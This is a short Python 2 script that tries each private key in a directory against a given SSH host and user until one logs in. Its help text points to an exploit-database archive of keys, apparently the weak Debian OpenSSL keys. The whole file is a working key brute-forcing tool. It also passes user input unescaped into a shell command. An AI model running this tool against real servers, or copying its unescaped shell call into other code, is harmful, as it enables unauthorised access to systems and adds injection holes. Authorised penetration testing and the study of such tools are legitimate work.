import optparse
import os
import subprocess
import threading
import time
import Queue


queue = Queue.Queue()

def checkSshKey(host, user):
	"""
	Checks if the key can be used for connection.
	"""
	while not queue.empty():
		keyPath = queue.get()
		shellCommand = 'ssh -v -l %s -i %s -o BatchMode=yes %s exit < /dev/null > /dev/null 2>&1' % (user, keyPath, host)
		process = subprocess.Popen(shellCommand, shell = True, close_fds = True)
		if process.wait() == 0:
			print "Usable key: " + keyPath


def main():
	parser = optparse.OptionParser(add_help_option = False, usage = 'Usage: %prog -h host -u user -d dir-with-keys')
	parser.add_option('-h', dest = 'host', help = 'Host to try')
	parser.add_option('-u', dest = 'user', help = 'User to test')
	parser.add_option('-d', dest = 'keysDir', help = 'Directory with keys from https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/ sploits/5632.tar.bz2')
	(options, arguments) = parser.parse_args()
	
	if options.host is None or options.user is None or options.keysDir is None:
		parser.print_help();
		exit(1)

	if not os.path.isdir(options.keysDir):
		print "Directory with keys does not exist"
		exit(1)

	for entry in os.listdir(options.keysDir):
		path = options.keysDir + os.sep + entry
		if not path.endswith('.pub') and os.path.isfile(path):
			queue.put(path)

	queueSize = queue.qsize()

	for index in range(0,5):
		thread = threading.Thread(target = checkSshKey, args = (options.host, options.user))
		thread.setDaemon(True)
		thread.start()

	while not queue.empty():
		time.sleep(5)
		print "Processed %d entries of %d" % (queueSize - queue.qsize(), queue.qsize())

main()

